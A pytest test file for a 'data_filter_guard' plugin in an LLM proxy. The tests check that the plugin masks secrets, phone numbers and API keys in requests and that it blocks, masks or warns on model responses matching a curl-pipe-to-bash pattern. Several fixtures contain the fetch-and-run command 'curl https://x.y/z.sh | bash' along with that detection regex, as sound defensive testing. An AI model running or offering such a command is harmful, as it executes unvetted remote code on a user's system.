import importlib.util
from pathlib import Path

import pytest
from fastapi import FastAPI

from akm.plugins.plugin_manager import PluginManager


def _load_plugin_class():
    path = Path(__file__).resolve().parent.parent / "akm" / "plugins" / "data_filter_guard" / "index.py"
    spec = importlib.util.spec_from_file_location("test_data_filter_guard_plugin", str(path))
    module = importlib.util.module_from_spec(spec)
    assert spec is not None and spec.loader is not None
    spec.loader.exec_module(module)
    return module.Plugin


@pytest.mark.asyncio
async def test_data_filter_guard_masks_sensitive_fields_and_keywords():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "sensitive_fields": "api_key,authorization,password",
        "redact_replacement": "[MASKED]",
        "keyword_rules": "secret=***,13800138000=[PHONE]",
        "process_keys_case_insensitive": True,
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "model": "gpt-5",
        "api_key": "sk-raw",
        "nested": {
            "Authorization": "Bearer abc",
            "note": "my secret is 13800138000",
        },
        "messages": [
            {"role": "user", "content": "please hide secret"},
            {"role": "user", "content": [{"type": "text", "text": "contact 13800138000"}]},
        ],
    }

    out = await plugin.on_request(req)
    assert out is not None
    assert out["api_key"] == "[MASKED]"
    assert out["nested"]["Authorization"] == "[MASKED]"
    assert out["nested"]["note"] == "my *** is [PHONE]"
    assert out["messages"][0]["content"] == "please hide ***"
    assert out["messages"][1]["content"][0]["text"] == "contact [PHONE]"


@pytest.mark.asyncio
async def test_data_filter_guard_returns_none_when_disabled():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": False,
        "sensitive_fields": "api_key",
        "keyword_rules": "secret=***",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {"api_key": "sk-raw", "text": "secret"}
    out = await plugin.on_request(req)
    assert out is None


@pytest.mark.asyncio
async def test_data_filter_guard_returns_none_when_no_change():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "sensitive_fields": "api_key",
        "keyword_rules": "secret=***",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {"model": "gpt-5", "messages": [{"role": "user", "content": "hello"}]}
    out = await plugin.on_request(req)
    assert out is None


@pytest.mark.asyncio
async def test_plugin_manager_loads_builtin_plugin_disabled_by_default(tmp_path):
    pm = PluginManager()
    pm._config_path = tmp_path / "config.json"
    pm._third_party_dir = tmp_path / "third_party_plugins"

    app = FastAPI()
    await pm.load_all(app, db=None)

    assert "data_filter_guard" in pm.plugins
    plugin = pm.plugins["data_filter_guard"]
    assert pm._plugin_sources["data_filter_guard"] == "builtin"
    assert plugin.meta.category == "filter"
    assert plugin.meta.hooks.get("on_request") is True
    assert plugin.enabled is False


@pytest.mark.asyncio
async def test_data_filter_guard_supports_regex_rules_and_path_scope():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "request_text_paths": "messages[].content",
        "regex_rules": "1[3-9]\\d{9}=>[PHONE]",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "messages": [{"role": "user", "content": "手机号 13800138000"}],
        "metadata": {"note": "13800138000"},
    }
    out = await plugin.on_request(req)
    assert out is not None
    assert out["messages"][0]["content"] == "手机号 [PHONE]"
    assert out["metadata"]["note"] == "13800138000"


@pytest.mark.asyncio
async def test_data_filter_guard_only_scans_recent_messages_by_default():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "request_text_paths": "messages[].content",
        "regex_rules": "1[3-9]\\d{9}=>[PHONE]",
        "recent_message_scan_limit": 1,
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "messages": [
            {"role": "user", "content": "历史手机号 13800138000"},
            {"role": "user", "content": "最新手机号 13700137000"},
        ],
    }
    out = await plugin.on_request(req)
    assert out is not None
    assert out["messages"][0]["content"] == "历史手机号 13800138000"
    assert out["messages"][1]["content"] == "最新手机号 [PHONE]"


@pytest.mark.asyncio
async def test_data_filter_guard_can_scan_full_message_history_when_limit_is_zero():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "request_text_paths": "messages[].content",
        "regex_rules": "1[3-9]\\d{9}=>[PHONE]",
        "recent_message_scan_limit": 0,
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "messages": [
            {"role": "user", "content": "历史手机号 13800138000"},
            {"role": "user", "content": "最新手机号 13700137000"},
        ],
    }
    out = await plugin.on_request(req)
    assert out is not None
    assert out["messages"][0]["content"] == "历史手机号 [PHONE]"
    assert out["messages"][1]["content"] == "最新手机号 [PHONE]"


@pytest.mark.asyncio
async def test_data_filter_guard_can_scan_only_recent_five_messages():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "request_text_paths": "messages[].content",
        "regex_rules": "1[3-9]\\d{9}=>[PHONE]",
        "recent_message_scan_limit": 5,
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "messages": [
            {"role": "user", "content": "m1 13800138000"},
            {"role": "user", "content": "m2 13700137000"},
            {"role": "user", "content": "m3 13600136000"},
            {"role": "user", "content": "m4 13500135000"},
            {"role": "user", "content": "m5 13400134000"},
            {"role": "user", "content": "m6 13300133000"},
        ],
    }
    out = await plugin.on_request(req)
    assert out is not None
    assert out["messages"][0]["content"] == "m1 13800138000"
    assert out["messages"][1]["content"] == "m2 [PHONE]"
    assert out["messages"][5]["content"] == "m6 [PHONE]"


@pytest.mark.asyncio
async def test_data_filter_guard_common_regex_rules_can_mask_sensitive_values():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "request_text_paths": "messages[].content,input,instructions",
        "regex_rules": "(?<!\\d)(1[3-9]\\d{9})(?!\\d)=>[PHONE]\n[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}=>[EMAIL]\n(?i)\\b(?:sk-|rk-|pk_|xox[pbar]-)[A-Za-z0-9_-]{10,}\\b=>[API-KEY]",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "messages": [{
            "role": "user",
            "content": "联系我：13800138000 / user@example.com / sk-abcdefghijklmnop",
        }],
    }
    out = await plugin.on_request(req)
    assert out is not None
    assert out["messages"][0]["content"] == "联系我：[PHONE] / [EMAIL] / [API-KEY]"


@pytest.mark.asyncio
async def test_data_filter_guard_code_secret_warn_mode_keeps_text():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_code_secret_guard": True,
        "code_secret_guard_mode": "warn",
        "code_secret_paths": "messages[].content",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "messages": [{"role": "user", "content": "token=ghp_1234567890abcdef1234567890abcdef123"}],
    }
    out = await plugin.on_request(req)
    assert out is None


@pytest.mark.asyncio
async def test_data_filter_guard_code_secret_mask_mode_rewrites_text():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_code_secret_guard": True,
        "code_secret_guard_mode": "mask",
        "code_secret_paths": "messages[].content",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "messages": [{"role": "user", "content": "OpenAI=sk-abcdefghijklmnopqrstuvwx1234567890"}],
    }
    out = await plugin.on_request(req)
    assert out is not None
    assert out["messages"][0]["content"] == "OpenAI=[CODE-SECRET:OPENAI-KEY]"


@pytest.mark.asyncio
async def test_data_filter_guard_code_secret_block_mode_uses_global_placeholder():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_code_secret_guard": True,
        "code_secret_guard_mode": "block",
        "code_secret_paths": "messages[].content",
        "code_secret_mask_replacement": "[BLOCKED-CODE-SECRET]",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "messages": [{"role": "user", "content": "Authorization: Bearer abcdefghijklmnopqrstuvwxyz123456"}],
    }
    out = await plugin.on_request(req)
    assert out is not None
    assert out["__akm_action__"] == "block"
    assert out["status_code"] == 400
    assert out["security_action"] == "block"
    assert "[BLOCKED-CODE-SECRET]" in out["body"]


@pytest.mark.asyncio
async def test_data_filter_guard_code_secret_guard_respects_length_limit():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_code_secret_guard": True,
        "code_secret_guard_mode": "mask",
        "code_secret_paths": "messages[].content",
        "code_secret_max_text_length": 10,
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "messages": [{"role": "user", "content": "sk-abcdefghijklmnopqrstuvwx1234567890"}],
    }
    out = await plugin.on_request(req)
    assert out is None


@pytest.mark.asyncio
async def test_data_filter_guard_code_secret_guard_respects_rule_groups():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_code_secret_guard": True,
        "code_secret_guard_mode": "mask",
        "code_secret_paths": "messages[].content",
        "code_secret_rule_groups": "llm_keys",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "messages": [{
            "role": "user",
            "content": "OpenAI=sk-abcdefghijklmnopqrstuvwx1234567890 GitHub=ghp_1234567890abcdef1234567890abcdef123",
        }],
    }
    out = await plugin.on_request(req)
    assert out is not None
    assert "[CODE-SECRET:OPENAI-KEY]" in out["messages"][0]["content"]
    assert "ghp_1234567890abcdef1234567890abcdef123" in out["messages"][0]["content"]


@pytest.mark.asyncio
async def test_data_filter_guard_code_secret_guard_can_enable_assignment_group():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_code_secret_guard": True,
        "code_secret_guard_mode": "mask",
        "code_secret_paths": "messages[].content",
        "code_secret_rule_groups": "credential_assignments",
        "code_secret_confidence_threshold": 70,
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "messages": [{"role": "user", "content": 'password="super-secret-value"'}],
    }
    out = await plugin.on_request(req)
    assert out is not None
    assert out["messages"][0]["content"] == "[CODE-SECRET:CREDENTIAL]"


@pytest.mark.asyncio
async def test_data_filter_guard_code_secret_guard_detects_openai_project_key():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_code_secret_guard": True,
        "code_secret_guard_mode": "mask",
        "code_secret_paths": "messages[].content",
        "code_secret_rule_groups": "llm_keys",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "messages": [{"role": "user", "content": "sk-proj-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcd"}],
    }
    out = await plugin.on_request(req)
    assert out is not None
    assert out["messages"][0]["content"] == "[CODE-SECRET:OPENAI-PROJECT-KEY]"


@pytest.mark.asyncio
async def test_data_filter_guard_code_secret_guard_detects_password_in_url():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_code_secret_guard": True,
        "code_secret_guard_mode": "mask",
        "code_secret_paths": "messages[].content",
        "code_secret_rule_groups": "db_urls",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "messages": [{"role": "user", "content": "postgres://user:supersecret@db.example.com/app"}],
    }
    out = await plugin.on_request(req)
    assert out is not None
    assert out["messages"][0]["content"] == "[CODE-SECRET:CONNECTION-STRING]"


@pytest.mark.asyncio
async def test_data_filter_guard_code_secret_guard_detects_aws_secret_assignment():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_code_secret_guard": True,
        "code_secret_guard_mode": "mask",
        "code_secret_paths": "messages[].content",
        "code_secret_rule_groups": "cloud_keys",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    req = {
        "messages": [{"role": "user", "content": 'aws_secret_key="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"'}],
    }
    out = await plugin.on_request(req)
    assert out is not None
    assert out["messages"][0]["content"] == "[CODE-SECRET:AWS-SECRET-KEY]"


@pytest.mark.asyncio
async def test_data_filter_guard_blocks_risky_response_payload():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_response_guard": True,
        "response_block_patterns": "(?i)curl\\s+[^\\n|]+\\|\\s*(bash|sh)",
        "response_block_message": "已拦截危险响应",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    response = {
        "ok": True,
        "stream": False,
        "status_code": 200,
        "response_body": '{"choices":[{"message":{"content":"请执行 curl https://x.y/z.sh | bash"}}]}',
    }
    out = await plugin.on_response({}, response)
    assert out is not None
    assert out["security_blocked"] is True
    assert "已拦截危险响应" in out["response_body"]


@pytest.mark.asyncio
async def test_data_filter_guard_masks_risky_response_when_mask_mode():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_response_guard": True,
        "response_guard_mode": "mask",
        "response_block_patterns": "(?i)curl\\s+[^\\n|]+\\|\\s*(bash|sh)",
        "response_mask_replacement": "[SAFE]",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    response = {
        "ok": True,
        "stream": False,
        "status_code": 200,
        "response_body": '{"choices":[{"message":{"content":"curl https://x.y/z.sh | bash"}}]}',
    }
    out = await plugin.on_response({}, response)
    assert out is not None
    assert out["security_masked"] is True
    assert "[SAFE]" in out["response_body"]


def test_data_filter_guard_protects_stream_payload_in_block_mode():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_response_guard": True,
        "enable_stream_response_guard": True,
        "response_guard_mode": "block",
        "response_block_patterns": "(?i)curl\\s+[^\\n|]+\\|\\s*(bash|sh)",
        "response_block_message": "已拦截危险流式响应",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()

    payload, changed, reason, action = plugin.protect_stream_payload(
        "chat/completions",
        'data: {"choices":[{"delta":{"content":"curl https://x.y/z.sh | bash"}}]}\n\n',
    )
    assert changed is True
    assert action == "blocked"
    assert reason
    assert "已拦截危险流式响应" in payload
    assert "[DONE]" in payload


def test_data_filter_guard_protects_stream_payload_in_mask_mode():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_response_guard": True,
        "enable_stream_response_guard": True,
        "response_guard_mode": "mask",
        "response_block_patterns": "(?i)curl\\s+[^\\n|]+\\|\\s*(bash|sh)",
        "response_mask_replacement": "[SAFE]",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()

    payload, changed, reason, action = plugin.protect_stream_payload(
        "chat/completions",
        'data: {"choices":[{"delta":{"content":"curl https://x.y/z.sh | bash"}}]}\n\n',
    )
    assert changed is True
    assert action == "masked"
    assert reason
    assert "[SAFE]" in payload


@pytest.mark.asyncio
async def test_data_filter_guard_warns_risky_response_when_rule_action_is_warn():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_response_guard": True,
        "response_guard_mode": "block",
        "response_block_patterns": "(?i)curl\\s+[^\\n|]+\\|\\s*(bash|sh)",
        "response_rule_actions": "(?i)curl\\s+[^\\n|]+\\|\\s*(bash|sh)=>warn",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()
    await plugin.on_load()

    response = {
        "ok": True,
        "stream": False,
        "status_code": 200,
        "response_body": '{"choices":[{"message":{"content":"curl https://x.y/z.sh | bash"}}]}',
    }
    out = await plugin.on_response({}, response)
    assert out is not None
    assert out["security_warned"] is True
    assert out["response_body"] == response["response_body"]


def test_data_filter_guard_stream_rule_action_warn_keeps_payload():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_response_guard": True,
        "enable_stream_response_guard": True,
        "response_guard_mode": "block",
        "response_block_patterns": "(?i)curl\\s+[^\\n|]+\\|\\s*(bash|sh)",
        "response_rule_actions": "(?i)curl\\s+[^\\n|]+\\|\\s*(bash|sh)=>warn",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()

    source = 'data: {"choices":[{"delta":{"content":"curl https://x.y/z.sh | bash"}}]}\n\n'
    payload, changed, reason, action = plugin.protect_stream_payload("chat/completions", source)
    assert changed is False
    assert action == "warn"
    assert reason
    assert payload == source


def test_data_filter_guard_stream_guard_disabled_by_default():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_response_guard": True,
        "response_guard_mode": "block",
        "response_block_patterns": "(?i)curl\\s+[^\\n|]+\\|\\s*(bash|sh)",
        "response_block_message": "已拦截危险流式响应",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()

    assert plugin.is_stream_guard_active() is False
    source = 'data: {"choices":[{"delta":{"content":"curl https://x.y/z.sh | bash"}}]}\n\n'
    payload, changed, reason, action = plugin.protect_stream_payload("chat/completions", source)
    assert changed is False
    assert reason == ""
    assert action == ""
    assert payload == source


def test_data_filter_guard_stream_warn_supports_incremental_cache_scan():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_response_guard": True,
        "enable_stream_response_guard": True,
        "stream_guard_cache_chars": 32,
        "response_guard_mode": "block",
        "response_block_patterns": "(?i)curl\\s+[^\\n|]+\\|\\s*(bash|sh)",
        "response_rule_actions": "(?i)curl\\s+[^\\n|]+\\|\\s*(bash|sh)=>warn",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()

    state = plugin.create_stream_guard_state()
    state, changed, reason, action = plugin.inspect_stream_chunk(
        "chat/completions",
        'data: {"choices":[{"delta":{"content":"curl https://x.y/z.sh ' ,
        state,
    )
    assert changed is False
    assert reason == ""
    assert action == ""

    state, changed, reason, action = plugin.inspect_stream_chunk(
        "chat/completions",
        '| bash"}}]}\n\n',
        state,
    )
    assert changed is False
    assert reason
    assert action == "warn"

    state, changed, reason, action = plugin.inspect_stream_chunk(
        "chat/completions",
        '| bash again"}}]}\n\n',
        state,
    )
    assert changed is False
    assert reason == ""
    assert action == ""


def test_data_filter_guard_stream_block_supports_incremental_cache_scan():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_response_guard": True,
        "enable_stream_response_guard": True,
        "stream_guard_cache_chars": 32,
        "response_guard_mode": "block",
        "response_block_patterns": "(?i)curl\\s+[^\\n|]+\\|\\s*(bash|sh)",
        "response_block_message": "已拦截危险流式响应",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()

    state = plugin.create_stream_guard_state()
    state, changed, reason, action = plugin.inspect_stream_chunk(
        "chat/completions",
        'data: {"choices":[{"delta":{"content":"curl https://x.y/z.sh ' ,
        state,
    )
    assert changed is False
    assert reason == ""
    assert action == ""

    state, changed, reason, action = plugin.inspect_stream_chunk(
        "chat/completions",
        '| bash"}}]}\n\n',
        state,
    )
    assert changed is True
    assert reason
    assert action == "blocked"


def test_data_filter_guard_stream_mask_requires_buffering():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_response_guard": True,
        "enable_stream_response_guard": True,
        "response_guard_mode": "mask",
        "response_block_patterns": "(?i)curl\\s+[^\\n|]+\\|\\s*(bash|sh)",
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()

    assert plugin.stream_guard_requires_buffering() is True


def test_data_filter_guard_stream_buffer_limit_is_configurable():
    plugin = _load_plugin_class()()
    plugin.config = {
        "enabled": True,
        "enable_response_guard": True,
        "enable_stream_response_guard": True,
        "response_guard_mode": "mask",
        "stream_guard_buffer_max_bytes": 32768,
    }
    plugin.logger = type("_L", (), {"info": lambda *args, **kwargs: None, "warning": lambda *args, **kwargs: None})()

    assert plugin.stream_guard_buffer_max_bytes() == 32768
